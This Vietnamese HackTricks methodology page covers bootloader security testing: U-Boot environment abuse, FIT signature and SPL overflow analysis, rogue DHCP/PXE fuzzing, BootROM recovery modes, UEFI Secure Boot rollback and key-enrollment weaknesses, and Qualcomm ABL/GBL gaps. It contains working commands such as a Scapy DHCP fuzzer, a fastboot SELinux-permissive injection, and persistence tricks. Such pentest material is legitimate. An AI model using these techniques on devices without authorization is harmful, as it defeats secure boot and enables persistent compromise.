# Kiểm thử Bootloader

{{#include ../../banners/hacktricks-training.md}}

Các bước sau được khuyến nghị khi chỉnh sửa cấu hình khởi động thiết bị và kiểm thử các bootloader như U-Boot và các trình nạp khởi động thuộc lớp UEFI. Tập trung vào việc giành quyền thực thi mã ở giai đoạn sớm, đánh giá các biện pháp bảo vệ chữ ký/rollback và khai thác các đường dẫn recovery hoặc network-boot.

Liên quan: bypass secure-boot trên MediaTek qua patching bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Các cách nhanh để khai thác U-Boot và lạm dụng môi trường

1. Truy cập shell của trình thông dịch
   - Trong quá trình khởi động, nhấn một phím ngắt đã biết (thường là phím bất kỳ, 0, dấu cách hoặc một chuỗi "magic" riêng của bo mạch) trước khi `bootcmd` thực thi để chuyển đến dấu nhắc U-Boot.<sup>[[1]](#references)</sup>

2. Kiểm tra trạng thái khởi động và các biến
   - Các lệnh hữu ích:
     - `printenv` (xuất môi trường)
     - `bdinfo` (thông tin bo mạch, địa chỉ bộ nhớ)
     - `help bootm; help booti; help bootz` (các phương thức khởi động kernel được hỗ trợ)
     - `help ext4load; help fatload; help tftpboot` (các trình nạp có sẵn)

3. Sửa đổi tham số khởi động để mở root shell
   - Thêm `init=/bin/sh` để kernel mở shell thay vì chạy init thông thường:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot từ máy chủ TFTP của bạn
   - Cấu hình mạng và tải kernel/fit image từ LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Duy trì thay đổi thông qua môi trường
   - Nếu vùng lưu trữ env không được bảo vệ chống ghi, bạn có thể duy trì quyền kiểm soát:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kiểm tra các biến như `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` ảnh hưởng đến các đường dẫn dự phòng. Giá trị cấu hình sai có thể cho phép truy cập shell nhiều lần.

6. Kiểm tra các tính năng debug/không an toàn
   - Tìm: `bootdelay` > 0, `autoboot` bị tắt, `usb start; fatload usb 0:1 ...` không bị hạn chế, khả năng dùng `loady`/`loads` qua serial, `env import` từ phương tiện không đáng tin cậy và kernel/ramdisk được tải mà không kiểm tra chữ ký.

7. Kiểm thử image/xác minh U-Boot
   - Nếu nền tảng tuyên bố hỗ trợ secure/verified boot với FIT image, hãy thử cả image chưa ký và image đã bị chỉnh sửa:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Việc thiếu `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` hoặc hành vi `verify=n` kiểu cũ thường cho phép khởi động payload tùy ý.
   - Đừng chỉ dừng lại ở kết quả cho phép/từ chối đơn giản: nghiên cứu FIT gần đây cho thấy chính đường dẫn xác minh có thể là bề mặt tấn công trước xác thực. Kiểm thử âm tính dữ liệu FIT được lưu bên ngoài (`data-offset`, `data-position`, `data-size`), việc chọn cấu hình đã ký, `loadables` và cách xử lý overlay / `extra-conf`.
   - Nếu có cây mã nguồn tương ứng, `test/vboot/vboot_test.sh` là cách nhanh để tái hiện hành vi xác minh FIT trong U-Boot sandbox trước khi thử trên phần cứng thật.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` và các luồng khởi động bằng script
   - Trong các bản dựng U-Boot hiện đại, `bootcmd` thường chỉ là một trình bao bọc quanh Standard Boot. Điều đó có nghĩa là phương tiện có thể ghi, PXE hoặc SPI flash có thể trở thành ranh giới tin cậy thực sự, ngay cả khi môi trường hiển thị có vẻ vô hại.
   - `extlinux` bootmeth tìm `extlinux/extlinux.conf` bên dưới `/` và `/boot`; script bootmeth tìm `boot.scr.uimg` trước rồi đến `boot.scr`. Khi khởi động qua mạng, tên tệp script có thể được lấy từ `boot_script_dhcp`.
   - Các lệnh phân loại hữu ích:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Các trường hợp lạm dụng cần kiểm thử: phương tiện USB/SD do attacker kiểm soát đứng trước trong `boot_targets`, `/boot/extlinux/extlinux.conf` có thể ghi, TFTP rogue cung cấp `boot.scr`, hoặc thực thi script qua SPI bằng `script_offset_f`.
   - Nếu nền tảng dựa vào xác minh FIT, hãy bảo đảm các cấu hình được ký ở cấp cấu hình, không chỉ ở cấp từng image; `required-mode=all` an toàn hơn việc chấp nhận bất kỳ khóa bắt buộc đơn lẻ nào.

### Dữ liệu FIT bên ngoài của SPL bị sao chép trước khi xác minh

Khi tải FIT bằng SPL, chữ ký cấu hình còn nguyên không khiến metadata của payload bên ngoài trở nên an toàn. U-Boot loại `data-position`, `data-offset` và `data-size` khỏi các thuộc tính cấu hình được ký. Trong các đường dẫn `load_simple_fit()` bị ảnh hưởng, SPL lấy offset nguồn và độ dài cần sao chép từ những trường này, rồi gọi `info->read()` **trước** khi kiểm tra hash của image. Vì vậy, một FIT được tạo thủ công trên phương tiện khởi động có thể ghi đè RAM mà không cần giả mạo chữ ký. Thuộc tính `load` đã ký thường cố định địa chỉ đích, vì vậy trước tiên hãy xác định liệu thao tác sao chép quá dài có thể chạm tới stack hoặc dữ liệu điều khiển khác tính từ địa chỉ đó hay không.<sup>[[15]](#references)[[16]](#references)</sup>

Hãy lần theo loader thực tế và memory map của bo mạch, thay vì mặc định rằng dữ liệu được đọc từ flash: loader RAM trong ví dụ đã đi tới `spl_ram_load_read()` và `memcpy()`. Tại vị trí gọi hàm, ghi lại `fit_offset` và mọi địa chỉ cơ sở FIT được reader cộng thêm, độ dài block của loader (`spl_get_bl_len(info)`), mọi căn chỉnh riêng của fork, `read_offset` và `size` sau cùng, đích `src_ptr`, cùng vị trí lưu return address. Kiểm tra xem vùng nguồn được ánh xạ liên tục có bao phủ khoảng cách cần sao chép hay không, có chồng lấn với đích hay không, và các byte tại vị trí nguồn có thể cung cấp con trỏ trỏ vào dữ liệu FIT do attacker kiểm soát hay không. Kỹ thuật [partial return-address overwrite](../../binary-exploitation/stack-overflow/ret2win/) tổng quát có thể áp dụng nếu một con trỏ đầy đủ không đáp ứng được các ràng buộc căn chỉnh của loader.<sup>[[16]](#references)</sup>

Trong bản dựng thử nghiệm AST2600 32-bit của các nhà nghiên cứu, `src_ptr` là `0x80001000` và return address được lưu của `memcpy` nằm tại `0x902ffe24`. Họ sử dụng một bản dựng upstream đã chỉnh sửa, dùng cách bố trí stack và các helper căn chỉnh của OpenBMC: RAM reader cộng thêm base FIT `0x10000`, còn các helper này làm tròn offset nguồn xuống theo `ARCH_DMA_MINALIGN` (64 byte). Một con trỏ little-endian hữu ích tại `0x902fffe4` cùng thao tác sao chép kết thúc sớm hơn một byte đã chỉ thay đổi ba byte thấp của return address được lưu, giữ nguyên byte cao bằng 0 đã biết. RAM loader upstream chỉ dùng độ dài block một byte, vì vậy cách căn chỉnh 64 byte và workaround partial-overwrite này không phải yêu cầu chung của SPL. Hãy tính lại địa chỉ, độ dài block của loader và phạm vi sao chép cho từng bản dựng. Trong phép tính ban đầu bên dưới, `fit_offset` là phần địa chỉ cơ sở FIT được RAM reader cộng thêm, không nhất thiết là đối số truyền cho `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Bản sửa upstream giới hạn cả `data-size` thô lẫn kích thước truyền **được căn chỉnh theo block** trước khi gọi `info->read()`. Đường dẫn overlay truyền dung lượng thực của buffer, trong khi các caller khác dùng `CONFIG_SYS_BOOTM_LEN`, vốn chỉ là giới hạn trên tương đối rộng chứ không chứng minh rằng đích còn đủ bộ nhớ trống. Khi đánh giá một vendor fork, hãy xác minh các kiểm tra đó có mặt và so sánh phạm vi copy được phép với vùng stack SPL và các vùng dành riêng thực tế của board.<sup>[[15]](#references)[[16]](#references)</sup>

## Bề mặt khởi động mạng (DHCP/PXE) và máy chủ giả mạo

9. Fuzzing tham số PXE/DHCP
   - Cơ chế xử lý BOOTP/DHCP cũ của U-Boot từng có các vấn đề về an toàn bộ nhớ. Ví dụ, CVE‑2024‑42040 mô tả việc rò rỉ bộ nhớ thông qua các phản hồi DHCP được tạo có chủ đích, có thể làm lộ byte từ bộ nhớ U-Boot ra mạng.<sup>[[4]](#references)</sup> Kiểm thử các đường dẫn mã DHCP/PXE bằng các giá trị quá dài hoặc trường hợp biên (tùy chọn 67 bootfile-name, vendor options, các trường file/servername) và theo dõi tình trạng treo/rò rỉ.
   - Đoạn mã Scapy tối thiểu để kiểm thử các tham số khởi động trong quá trình netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Ngoài ra, hãy xác minh xem các trường tên tệp PXE có được truyền đến logic shell/loader mà không qua bước lọc hay không khi được liên kết với các script provisioning phía OS.

10. Kiểm tra command injection trên rogue DHCP server
   - Thiết lập dịch vụ DHCP/PXE giả mạo và thử chèn ký tự vào các trường tên tệp hoặc tùy chọn để tiếp cận trình thông dịch lệnh ở các giai đoạn sau của chuỗi khởi động. Metasploit’s DHCP auxiliary, `dnsmasq` hoặc các script Scapy tự viết đều phù hợp. Trước tiên, hãy đảm bảo cách ly mạng lab.

## Các chế độ khôi phục SoC ROM ghi đè quá trình khởi động thông thường

Nhiều SoC có chế độ “loader” trong BootROM, chấp nhận mã qua USB/UART ngay cả khi image flash không hợp lệ. Nếu chưa bật các cầu chì secure-boot, chế độ này có thể cho phép thực thi mã tùy ý ở giai đoạn rất sớm trong chuỗi.

- NXP i.MX (Serial Download Mode)
  - Công cụ: `uuu` (mfgtools3) hoặc `imx-usb-loader`.
  - Ví dụ: `imx-usb-loader u-boot.imx` để nạp và chạy U-Boot tùy chỉnh từ RAM.
- Allwinner (FEL)
  - Công cụ: `sunxi-fel`.
  - Ví dụ: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` hoặc `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Công cụ: `rkdeveloptool`.
  - Ví dụ: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` để nạp loader và tải lên U-Boot tùy chỉnh.

Đánh giá xem eFuse/OTP secure-boot của thiết bị đã được ghi hay chưa. Nếu chưa, các chế độ tải xuống BootROM thường xuyên bỏ qua mọi bước xác minh ở cấp cao hơn (U-Boot, kernel, rootfs) bằng cách thực thi trực tiếp payload giai đoạn đầu của bạn từ SRAM/DRAM.

## Bootloader UEFI/PC: kiểm tra nhanh

11. Kiểm tra việc can thiệp ESP, rollback và đăng ký khóa
   - Gắn phân vùng EFI System Partition (ESP) và kiểm tra các thành phần loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, đường dẫn logo của nhà cung cấp.
   - Khi có thể, hãy trích xuất trạng thái Secure Boot và cơ sở dữ liệu khóa từ OS:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Nếu nền tảng đang ở Setup Mode, chấp nhận đăng ký khóa mà không cần xác thực hoặc được xuất xưởng với Platform Key thử nghiệm/mặc định (nhóm PKfail), quản trị viên cục bộ hoặc kẻ tấn công có quyền truy cập vật lý có thể đăng ký KEK/db của mình và giữ cho Secure Boot trông như vẫn “được bật” trong khi khởi động các EFI binary tùy ý.<sup>[[3]](#references)</sup>
   - Thử khởi động bằng các thành phần boot đã bị hạ cấp hoặc đã biết là có lỗ hổng nếu các mục thu hồi Secure Boot (dbx) chưa được cập nhật. Nếu nền tảng vẫn tin cậy các shim/bootmanager cũ, bạn thường có thể tải kernel của mình hoặc `grub.cfg` từ ESP để tạo persistence.
   - Trên Windows, các máy đã được vá vẫn có thể chấp nhận boot manager đã ký nhưng có lỗ hổng nếu signer `Microsoft Windows Production PCA 2011` vẫn chưa có trong firmware `dbx`, như đã quan sát với BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Một bypass kiểu Baton Drop có thể đăng ký MOK của kẻ tấn công; sau đó, shim hợp lệ có thể tải EFI payload được ký bằng khóa đó trong những lần khởi động tiếp theo.<sup>[[12]](#references)[[13]](#references)</sup> Việc thu hồi signer Windows cũ sau đó không xóa MOK đã đăng ký, vì vậy đường tấn công dựa trên shim có thể tiếp tục tồn tại nếu shim đó vẫn được tin cậy.<sup>[[12]](#references)</sup>
   - Trước khi thử nghiệm đường tấn công rollback này trên máy UEFI được ủy quyền, hãy kiểm tra **trạng thái thu hồi hiệu lực của firmware**, không chỉ lịch sử cập nhật Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft cung cấp lệnh kiểm tra PowerShell chỉ đọc, chạy với quyền nâng cao, cho signer 2011 trong `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` chỉ là một manh mối: hãy xác nhận thành phần khởi động đã ký cụ thể và các revocation khác trong một lab có thể khôi phục.<sup>[[12]](#references)[[14]](#references)</sup> Bản cập nhật registry đang chờ xử lý hoặc chứng chỉ ký đã hết hạn không tương đương với việc hoàn tất revocation trong `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Kiểm thử revocation shim / SBAT / dbx lỗi thời
   - Các shim cũ được Microsoft ký và các bản fork của nhà cung cấp vẫn có thể tạo đường dẫn bootkit kiểu BYOVD nếu các revocation đã lỗi thời. Trong một lab biệt lập, đặt một shim từng có lỗ hổng trên ESP rồi thử chainload `grubx64.efi` hoặc kernel của bạn.<sup>[[11]](#references)</sup>
   - Phân loại nhanh:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Nếu shim vẫn chạy dù có trong danh sách thu hồi, firmware/OS có các bản cập nhật `dbx` lỗi thời hoặc tin cậy một loader được fork nhưng chưa bao giờ kế thừa các biện pháp bảo vệ SBAT của upstream.

13. Lỗi phân tích logo khởi động (nhóm LogoFAIL)
   - Một số firmware OEM/IBV có lỗ hổng phân tích ảnh trong DXE khi xử lý logo khởi động. Nếu kẻ tấn công có thể đặt một ảnh được tạo đặc biệt trên ESP theo đường dẫn riêng của nhà cung cấp (ví dụ: `\EFI\<vendor>\logo\*.bmp`) rồi khởi động lại, thì có thể thực thi mã trong giai đoạn khởi động sớm ngay cả khi Secure Boot được bật. Hãy kiểm tra xem nền tảng có chấp nhận logo do người dùng cung cấp hay không và các đường dẫn đó có thể được ghi từ OS hay không.<sup>[[2]](#references)</sup>


## Khoảng trống tin cậy của Android/Qualcomm ABL + GBL (Android 16)

Trên các thiết bị Android 16 sử dụng ABL của Qualcomm để tải **Generic Bootloader Library (GBL)**, hãy xác minh liệu ABL có **xác thực** ứng dụng UEFI mà nó tải từ phân vùng `efisp` hay không. Nếu ABL chỉ kiểm tra **sự hiện diện** của ứng dụng UEFI mà không xác minh chữ ký, thì khả năng ghi vào `efisp` sẽ cho phép **thực thi mã không ký trước khi OS khởi chạy** khi khởi động.<sup>[[6]](#references)[[7]](#references)</sup>

Các bước kiểm tra thực tế và hướng khai thác:

- **Khả năng ghi vào efisp**: Cần có cách ghi một ứng dụng UEFI tùy chỉnh vào `efisp` (root/dịch vụ có đặc quyền, lỗi trong ứng dụng OEM, đường dẫn recovery/fastboot). Nếu không có khả năng này, không thể trực tiếp tiếp cận lỗ hổng trong quá trình tải GBL.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (lỗi ABL): Một số bản build chấp nhận các token bổ sung trong `fastboot oem set-gpu-preemption` và nối chúng vào dòng lệnh kernel. Có thể dùng cách này để buộc SELinux hoạt động ở chế độ permissive, cho phép ghi vào các phân vùng được bảo vệ:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Nếu thiết bị đã được vá, lệnh sẽ từ chối các đối số bổ sung.<sup>[[5]](#references)[[6]](#references)</sup>
- **Mở khóa bootloader qua cờ persistent**: Payload ở giai đoạn boot có thể thay đổi các cờ mở khóa persistent (ví dụ: `is_unlocked=1`, `is_unlocked_critical=1`) để mô phỏng `fastboot oem unlock` mà không cần qua các bước kiểm tra máy chủ/phê duyệt của OEM. Thay đổi trạng thái này sẽ được duy trì sau lần khởi động lại tiếp theo.<sup>[[6]](#references)</sup>

Ghi chú phòng thủ/đánh giá sơ bộ:

- Xác nhận ABL có thực hiện xác minh chữ ký trên payload GBL/UEFI từ `efisp` hay không. Nếu không, hãy xem `efisp` là bề mặt duy trì quyền truy cập có rủi ro cao.
- Theo dõi xem các trình xử lý fastboot OEM của ABL có được vá để **xác thực số lượng đối số** và từ chối các token bổ sung hay không.<sup>[[8]](#references)[[9]](#references)</sup>

## Thận trọng về phần cứng

Thận trọng khi tương tác với SPI/NAND flash trong giai đoạn đầu của quá trình boot (ví dụ: nối chân xuống mass để bỏ qua thao tác đọc) và luôn tham khảo datasheet của flash. Chập mạch sai thời điểm có thể làm hỏng thiết bị hoặc bộ nạp chương trình.

## Ghi chú và mẹo bổ sung

- Thử `env export -t ${loadaddr}` và `env import -t ${loadaddr}` để di chuyển các khối dữ liệu môi trường giữa RAM và bộ nhớ lưu trữ; một số nền tảng cho phép nhập env từ phương tiện di động mà không cần xác thực.
- Để duy trì quyền truy cập trên các hệ thống dựa trên Linux khởi động qua `extlinux.conf`, thường chỉ cần sửa dòng `APPEND` (để chèn `init=/bin/sh` hoặc `rd.break`) trên phân vùng boot nếu không có bước kiểm tra chữ ký.
- Nếu mục tiêu sử dụng cập nhật hai phân vùng / A/B, hãy xem lại các kỹ thuật chống rollback và làm lệch trạng thái phân vùng trong [tổng quan phân tích firmware](README.md) để không bỏ sót các lỗ hổng tin cậy chỉ xuất hiện ở trình cập nhật, bên ngoài chính bootloader.
- Nếu userland cung cấp `fw_printenv/fw_setenv`, hãy xác thực rằng `/etc/fw_env.config` khớp với vùng lưu trữ env thực tế. Offset cấu hình sai có thể khiến bạn đọc/ghi nhầm vùng MTD.

## References

- [1] [Phương pháp kiểm thử bảo mật firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Phát hiện LogoFAIL: Mối nguy hiểm từ việc phân tích hình ảnh trong quá trình khởi động hệ thống](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Các khóa nền tảng không đáng tin cậy làm suy yếu Secure Boot trong hệ sinh thái UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Chi tiết CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Ngăn chặn trước: Mở khóa Xiaomi bằng hai chuỗi không được làm sạch](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Lỗ hổng khai thác GBL trên Qualcomm Snapdragon 8 Elite cho phép kẻ tấn công mở khóa bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Kiến trúc Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Sửa lỗi truyền dữ liệu đầu vào không đáng tin cậy vào dòng lệnh kernel](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Thêm kiểm tra cho lệnh set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Không đủ an toàn để boot: Phá vỡ xác minh chữ ký FIT của U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Ghi chú lỗ hổng VU#616257 - Các bootloader shim UEFI được Microsoft ký có nguy cơ bị vượt qua Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: Huyền thoại được xác nhận](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit tương tự BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Cách quản lý các mục thu hồi Windows Boot Manager để thay đổi Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Bản vá U-Boot: Giới hạn kích thước dữ liệu bên ngoài trước khi đọc](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Những lợi ích ẩn của FIT: Vượt qua xác minh chữ ký trong U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
